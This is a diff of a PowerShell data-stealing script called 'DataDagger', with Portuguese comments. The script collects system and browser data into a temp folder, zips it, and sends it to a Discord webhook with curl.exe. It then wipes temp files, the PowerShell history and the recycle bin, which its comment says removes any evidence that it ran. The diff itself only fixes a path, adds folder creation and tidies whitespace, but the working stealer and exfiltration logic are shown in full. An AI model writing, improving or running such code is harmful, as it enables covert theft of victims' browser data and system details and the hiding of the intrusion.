@@ -316,7 +316,6 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 # Visão Final
 
 $output = @"
-
 ############################################################################################################################################################ 
 #                                                                                                                                                          #
 #   Nome       : DataDagger                                                                                                                                #
@@ -474,7 +473,20 @@ $drivers
 
 "@
 
-$output > $env:TEMP\$FolderName/computerData.txt
+$output > $env:TEMP\$FolderName\computerData.txt
+
+############################################################################################################################################################
+# Criação de pastas necessárias
+$folderPath = "$env:TEMP\$FolderName"
+$zipPath = "$env:TEMP\$ZIP"
+
+if (-not (Test-Path $folderPath)) {
+    New-Item -Path $folderPath -ItemType Directory -Force
+}
+
+if (-not (Test-Path $zipPath)) {
+    New-Item -Path $zipPath -ItemType Directory -Force
+}
 
 ############################################################################################################################################################
 # Dados do Browser
@@ -575,13 +587,11 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
- 
-
 ############################################################################################################################################################
 
 <#
 .NOTES 
-	Agora esta parte é para remover qualquer evidência que prove que o script correu
+    Agora esta parte é para remover qualquer evidência que prove que o script correu
 #>
 
 # Delete nos ficheiros da pasta Temp
@@ -600,7 +610,7 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
-		
+        
 ############################################################################################################################################################
 
 # sinal que acabou um Pop-up
